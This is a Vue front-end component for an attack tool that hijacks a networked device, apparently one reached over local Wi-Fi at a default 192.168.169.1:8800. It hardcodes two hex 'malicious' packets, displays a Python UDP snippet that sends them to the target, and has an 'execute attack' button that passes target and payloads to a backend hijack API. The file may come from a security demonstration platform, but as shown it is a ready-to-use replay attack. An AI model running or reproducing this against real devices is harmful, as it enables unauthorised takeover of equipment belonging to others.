<template>
  <div id="start-hijack">
    <a-card title="设置目标参数">
      <template #extra>
        <a-button type="primary" @click="resetToDefaults">填充默认值</a-button>
      </template>

      <a-form :layout="formLayout" :model="formState">
        <a-form-item label="目标IP">
          <a-input v-model:value="formState.deviceIp" placeholder="请输入目标IP (dst_ip)" />
        </a-form-item>
        <a-form-item label="目标端口">
          <a-input v-model:value="formState.port" placeholder="请输入目标端口 (dst_port)" />
        </a-form-item>
      </a-form>
    </a-card>

    <a-card title="socket代码">
      <pre><code class="language-python">{{ pythonCode }}</code></pre>
    </a-card>

    <TrafficDisplayGeneral/>

    <div class="button-container">
      <a-button
        type="primary"
        @click="handleClick"
        :loading="isLoading"
        class="large-button"
        danger
      >
        执行攻击
      </a-button>
    </div>

  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, computed } from 'vue'
import TrafficDisplayGeneral from '@/views/TrafficDisplayGeneral.vue'
import { startHijack } from '@/api/StartHijack';
import type { StartHijackParams } from '@/utils/types';
import { useTrafficHexStore } from '@/stores/useTrafficHexStore.ts'
import { useTrafficHexStore2 } from '@/stores/useTrafficHexStore2.ts'

const formLayout = 'vertical'; // 设置表单布局

// 获取流量pinia对象
const trafficHexStore = useTrafficHexStore();
const trafficHexStore2 = useTrafficHexStore2();
const trafficData1 = "ef0258000202000100000000d5000000140066148080b38000020000000000000000000031990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000";
const trafficData2 = "ef0258000202000100000000d7000000140066148080ff800002000000000000000000007d990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000";
// 设置流量内容
trafficHexStore.setTrafficHex(trafficData1);
trafficHexStore2.setTrafficHex2(trafficData2);
// 获取流量内容
const trafficHex1 = computed(() => trafficHexStore.trafficHex).value
const trafficHex2 = computed(() => trafficHexStore2.trafficHex2).value

// 定义初始值对象
const defaultValues = ref<StartHijackParams>({
  deviceIp: '192.168.169.1', // 设备 IP 的初始值
  port: 8800,             // 端口的初始值
  trafficHex: { trafficHex1, trafficHex2 }
});
// 创建一个对象来存储表单的状态
const formState = ref<StartHijackParams>({
  deviceIp: '', // 设备 IP
  port: 0, // 端口号
  trafficHex: { trafficHex1, trafficHex2 }
});

// 创建一个方法来重置表单状态为初始值
const resetToDefaults = () => {
  formState.value = defaultValues.value;
};

const pythonCode = ref( `import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # 创建原始套接字
sock.sendto(traffic1, (dst_ip, dst_port)) # 发送恶意流量包
sock.sendto(traffic2, (dst_ip, dst_port))
sock.close() # 关闭套接字
`);
onMounted(() => {
  // 这里爆红不用管，已经全局引入了。 放在onMounted里面可以保证其他组件加载完毕后 再引入prism进行代码高亮
  import('prismjs').then(prism => prism.highlightAll());
});

// 处理按钮点击事件的方法
const isLoading = ref(false);  // 按钮的状态
const handleClick = async () => {
  try {
    // 设置按钮加载状态为 true
    isLoading.value = true;

    // 获取流量内容
    const trafficHex = {
      trafficHex1: trafficHexStore.trafficHex,
      trafficHex2: trafficHexStore2.trafficHex2
    }

    // 调用 startHijack 接口
    const response = await startHijack({
      deviceIp: formState.value.deviceIp,
      port: formState.value.port,
      trafficHex: trafficHex
    });
    // 根据后端返回的数据执行相应操作
    //console.log(response.data);

  } catch (error) {
    // 处理错误
    console.error('There was an error!', error);
  } finally {
    // 不管请求成功与否，最后都将加载状态设置为 false
    isLoading.value = false;
  }
};
</script>

<style scoped>
.button-container {
  text-align: center;
  padding: 20px;
}
.large-button {
  width: 200px; /* 设置宽度 */
  height: 50px; /* 设置高度 */
  font-size: 16px; /* 可选：增加字体大小以适应更大的按钮 */
}
</style>
